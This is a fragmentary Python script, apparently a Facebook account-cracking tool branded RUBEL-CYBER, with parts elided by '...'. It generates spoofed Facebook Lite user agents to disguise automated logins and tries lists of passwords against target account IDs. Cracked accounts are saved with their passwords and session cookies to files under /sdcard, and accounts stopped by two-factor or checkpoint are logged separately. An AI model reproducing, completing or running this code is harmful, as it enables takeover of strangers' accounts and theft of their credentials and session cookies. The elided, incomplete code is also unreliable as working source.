...
############------[ LOGO ]------#########
def _ua_():
  fb_ver = random.choice(['457.0.0.0.52','457.0.0.0.35','456.0.0.7.52','455.0.0.9.101','456.0.0.5.52'])
  fb_ver_code = random.choice(['509000681','508901194','508801337','508701622','508401264'])
  fuck = random.choice(['{density=3.0,width=1080,height=1920}','{density=1.5,width=540,height=960}','{density=3.0,width=1920,height=1080}','{density=4.0,width=1440,height=2560}'])
  fuck_sim = random.choice(['Robi','Banglalink','TIGO','cricket','CLARO','MetroPCS','Grameenphone'])
  oppo_model = random.choice(['2411DRN47C','2311DRN14I','23124RN87C','2210129SG','2409BRN2CG'])
  android_ver = random.choice(['5.1.1','6.0.1','7.1.2','9','10','11','12','8.1.0','7.0','13'])
  randm_ua = f'[FBAN/FB4A;FBAV/'+fb_ver+';FBBV/'+fb_ver_code+';FBDM/'+fuck+';FBLC/pt_PT;FBRV/'+fuck_sim+';FBMF/Xiaomi Redmi;FBMF/Xiaomi Redmi;FBBD/com.facebook.lite;FBDV/'+oppo_model+';FBSV/'+android_ver+';FBOP/1;FBCA/armeabi-v7a:armeabi;]'
  return randm_ua
os.system('espeak -a 300 "well,come to, FF KING0011, tools"')
def logo():
...
def graphrm(id,psd,tid):
	global ok,cp,lk,lop
	togg=[]
	sys.stdout.write(f'\r\r{BG}[{W}RUBEL-CYBER{BG}]{G}{E}{BG}[{G}{lop}{W}/{G}{tid}{BG}]{E}{BG}[{W}OK{W}:{G}%s{W}/{S}%s{BG}]{E}'%(len(ok),len(lk)));sys.stdout.flush()
	for psw in psd:
		#ua=ua1()
		...
		if 'session_key' in lo:
			...
			print(f'\r\r{G}[RUBEL-CYBER-OK] {iid} | {psw}{W}');os.system('espeak -a 300 "ok id"');ok.append(id);open('/sdcard/RUBEL-CYBER-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			if 'y' in cokix:print(f'\r\r{R}[{G}COOKIES🍪{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
			break
		elif twfx in str(lo):
			iid = lo['error']['error_data']['uid']
			print(f'\r\r{BL}[RUBEL-CYBER2F] {iid} | {psw}{W}');os.system('espeak -a 300 "two,f id"');open('/sdcard/RUBEL-CYBER-2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
			...
			if iid in ok:pass
				...
				if 'y' in cpx:
					print(f'\r\r{R}[RUBEL-CYBER-CP] {iid} | {psw}{W}');cp.append(id);os.system('espeak -a 300 "cp id"');open('/sdcard/TKM-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
Main()
